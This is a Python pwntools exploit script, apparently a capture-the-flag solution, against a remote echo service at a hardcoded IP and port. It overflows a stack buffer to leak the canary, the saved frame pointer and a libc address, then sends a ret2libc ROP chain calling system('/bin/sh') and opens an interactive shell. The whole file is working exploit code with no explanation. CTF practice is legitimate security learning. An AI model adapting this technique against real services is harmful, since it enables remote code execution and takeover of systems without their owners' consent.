from pwn import *

IP, PORT = '158.247.199.6', 3333

context.arch = 'x86_64'
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

DEBUG = False
#context.log_level = 'debug'
#context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

def menu(sel):
    p.recvuntil('1. Echo\n> ')
    p.sendline(str(sel))

def _exit():
    menu(0)

def echo(dat):
    menu(1)
    p.recvuntil('Tell Me > ')
    p.send(dat)

while True:
    if DEBUG:
        p = process('./prob')
    else:
        p = remote(IP, PORT)
    
    echo('A'*0x88 + '\n')

    p.recvline()
    res = p.recvline(False)
    if len(res) < 7:
        log.warning('retry - canary')
        p.close()
        continue
    
    res = ('\x00' + res)[:8]
    canary = u64(res)

    log.success('leak: {:016x}'.format(canary))
    
    echo('A'*0x8f + '\n')
    p.recvline()
    res = p.recvline(False)
    if len(res) < 6:
        log.warning('retry - stack')
        p.close()
        continue
    
    res = res[:6].ljust(8, '\x00')
    rbp = u64(res)

    log.success(' rbp: {:016x}'.format(rbp))

    echo('A'*0x97 + '\n')
    p.recvline()
    res = p.recvline(False)
    if len(res) < 6:
        log.warning('retry - libc')
        p.close()
        continue
    
    res = res[:6].ljust(8, '\x00')
    libc_ret = u64(res)

    log.success('_lsm: {:016x}'.format(libc_ret))

    libc.address = libc_ret - libc.libc_start_main_return
    log.success('libc: {:016x}'.format(libc.address))

    rop = ROP(libc)

    rop.call('system', [next(libc.search('/bin/sh\0'))])
    rop_chain = rop.chain()

    payload = 'A'*0x88 + p64(canary) + p64(rbp) + p64(rop.find_gadget(['ret']).address) + rop_chain
    print(hex(len(payload)))
    if '\n' in payload:
        log.warning('retry - payload')
        p.close()
        continue
    echo(payload + '\n')

    _exit()

    try:
        p.sendline('echo AAA')
        p.recvuntil('AAA')
    except:
        log.warning('retry - rop')
        p.close()
        continue

    p.interactive()

    break
